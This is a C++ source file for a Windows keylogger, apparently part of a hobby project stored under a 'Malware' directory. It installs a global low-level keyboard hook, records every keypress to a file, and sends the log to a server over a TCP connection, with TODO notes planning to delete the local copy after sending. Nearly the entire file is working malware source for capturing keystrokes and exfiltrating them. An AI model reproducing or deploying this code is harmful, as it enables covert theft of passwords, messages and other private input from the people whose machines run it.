
#include"../lib/Malware/Keylogger.hpp"


Keylogger* Keylogger::instance = nullptr;

Keylogger* Keylogger::getInstance(const std::string& filename) {
    if (!instance) {
        instance = new Keylogger(filename);
    }
    return instance;
}

//TODO create a different instance where the server will be ran so other classes and functions can access it and not have a constnat connection while the malware is active.
Keylogger::Keylogger(const std::string& filename)  : fileHandler(filename), client("127.0.0.1", 1234) {
    instance = this;

    if (!client.connectToServer()) {
        std::cerr << "Failed to connect to server!" << std::endl;
    }
}

Keylogger::~Keylogger() {
    UninstallHook();
}



LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key[16] = {0};
            GetKeyNameTextA(kbd->scanCode << 16, key, sizeof(key));

            if(instance) {
                std::cout << "Key Pressed: " << key << std::endl;
                instance->fileHandler.writeFile(std::string(key));  // Write in the file and send the file to server.
            }
        }
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void Keylogger::InstallHook() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hook) {
        std::cerr << "Failed to install hook!\n";
    }
}


void Keylogger::UninstallHook() {
    if (hook) {
        UnhookWindowsHookEx(hook);
        hook = NULL;
    }
}

void Keylogger::SendFile() {
    std::string fileContent = fileHandler.readFile();
    //Check the content of the file.
    if (fileContent.empty()) return;

    //Notify the server
    if (!client.sendData("SEND_FILE")) return;

    //Send the data
    if (!client.sendData(fileContent)) {
        std::cerr << "Failed to send log file!" << std::endl;
    } else {
        std::cout << "Log file sent successfully!" << std::endl;
    }

}

//TODO Update the method to send the txt file to the server afyer the 'quit' key is pressed
//TODO Update the method to delete the file from the client after it sent it to the server
void Keylogger::Run() {
    InstallHook();
    std::cout << "Press ESC to exit." << std::endl;
    MSG msg;
    while (true) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                break;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        if (GetAsyncKeyState(VK_ESCAPE)) {
            SendFile();
            break;
        }
    }
    UninstallHook();
}